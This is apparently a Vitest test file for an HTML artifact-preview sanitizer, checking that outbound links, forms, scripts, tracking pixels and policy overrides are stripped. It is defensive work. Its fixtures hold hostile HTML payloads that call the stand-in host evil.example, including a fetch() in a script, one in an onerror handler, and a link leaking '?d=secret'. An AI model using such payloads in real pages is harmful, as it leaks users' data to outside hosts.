// @vitest-environment jsdom
//
// TD-5262: what an HTML artifact preview is cleaned of before it is shown.
// The frame runs no script and loads nothing already; these are the things
// that could still reach out when a person clicks, or without one.

import { describe, expect, it } from "vitest";

import { artifactPreviewSrcdoc, sanitizeArtifactHtml, STATIC_PREVIEW_NOTE } from "./artifact-html";
import { HTML_PREVIEW_CSP, HTML_PREVIEW_SANDBOX } from "./artifacts";

const PIXEL = "data:image/png;base64,iVBORw0KGgo=";

describe("sanitizeArtifactHtml", () => {
	it.each([
		["a link", '<a href="https://evil.example/?d=secret">Next page</a>', ["href", "evil.example"]],
		["an svg link", '<svg><a xlink:href="https://evil.example/">x</a></svg>', ["xlink:href", "evil.example"]],
		["a refresh", '<meta http-equiv="refresh" content="0;url=https://evil.example/">', ["<meta", "evil.example"]],
		["a preconnect", '<link rel="preconnect" href="https://evil.example">', ["<link", "evil.example"]],
		["a stylesheet", '<link rel="stylesheet" href="https://evil.example/a.css">', ["<link", "evil.example"]],
		["a base", '<base href="https://evil.example/">', ["<base", "evil.example"]],
		["a form", '<form action="https://evil.example/"><input name="q"><button>Go</button></form>', ["<form", "action=", "evil.example"]],
		["a button that posts", '<button formaction="https://evil.example/">Go</button>', ["formaction", "evil.example"]],
		["a script", "<script>fetch('https://evil.example/')</script>", ["<script", "evil.example"]],
		["a handler", '<img src="x" onerror="fetch(\'https://evil.example/\')">', ["onerror", "evil.example"]],
		["a remote image", '<img src="https://evil.example/pixel.png" alt="p">', ["evil.example"]],
		["a srcset", `<img src="${PIXEL}" srcset="https://evil.example/2x.png 2x">`, ["srcset", "evil.example"]],
		["a frame", '<iframe src="https://evil.example/"></iframe>', ["<iframe", "evil.example"]],
		["an object", '<object data="https://evil.example/x"></object>', ["<object", "evil.example"]],
		["a ping", '<a ping="https://evil.example/p">x</a>', ["ping=", "evil.example"]],
		["a video poster", '<video poster="https://evil.example/p.png"></video>', ["poster", "evil.example"]],
		["a javascript address", '<a href="javascript:alert(1)">x</a>', ["javascript:", "href"]],
		["a shadow root", '<template shadowrootmode="open"><a href="https://evil.example/">x</a></template>', ["<template", "evil.example"]],
	])("takes out %s", (_name, hostile, gone) => {
		const clean = sanitizeArtifactHtml(hostile);
		for (const fragment of gone) expect(clean).not.toContain(fragment);
	});

	it("keeps the words a link or a form showed", () => {
		expect(sanitizeArtifactHtml('<a href="https://x.example/">Read more</a>')).toContain(
			"Read more",
		);
	});

	it("keeps an inline image, headings, tables and inline styles", () => {
		const clean = sanitizeArtifactHtml(
			`<h1 style="color: red">Report</h1><table><tr><td>1</td></tr></table><img src="${PIXEL}" alt="chart">`,
		);
		expect(clean).toContain("<h1");
		expect(clean).toContain("color: red");
		expect(clean).toContain("<table>");
		expect(clean).toContain(`src="${PIXEL}"`);
	});

	it("keeps a whole document's styles, from the head and the body", () => {
		const clean = sanitizeArtifactHtml(
			"<!doctype html><html><head><title>t</title><style>h1{color:blue}</style></head>" +
				"<body><style>p{margin:0}</style><h1>Hi</h1></body></html>",
		);
		expect(clean).toContain("h1{color:blue}");
		expect(clean).toContain("p{margin:0}");
		expect(clean).toContain("<h1>Hi</h1>");
		expect(clean).not.toContain("<title");
	});

	it("leaves plain text and an empty string as they are", () => {
		expect(sanitizeArtifactHtml("just words")).toBe("just words");
		expect(sanitizeArtifactHtml("")).toBe("");
	});
});

describe("artifactPreviewSrcdoc", () => {
	it("still puts the policy first, and only once, around the cleaned markup", () => {
		const srcdoc = artifactPreviewSrcdoc(
			'<meta http-equiv="Content-Security-Policy" content="default-src *"><a href="https://evil.example/">x</a>',
		);
		expect(srcdoc.match(/Content-Security-Policy/g)).toHaveLength(1);
		expect(srcdoc).toContain(HTML_PREVIEW_CSP);
		expect(srcdoc).not.toContain("default-src *");
		expect(srcdoc).not.toContain("evil.example");
		expect(srcdoc.indexOf("Content-Security-Policy")).toBeLessThan(srcdoc.indexOf("<body>"));
	});

	it("does not loosen the frame", () => {
		expect(HTML_PREVIEW_SANDBOX).toBe("");
		expect(STATIC_PREVIEW_NOTE).toBe("Static preview. Links and scripts are off.");
	});
});
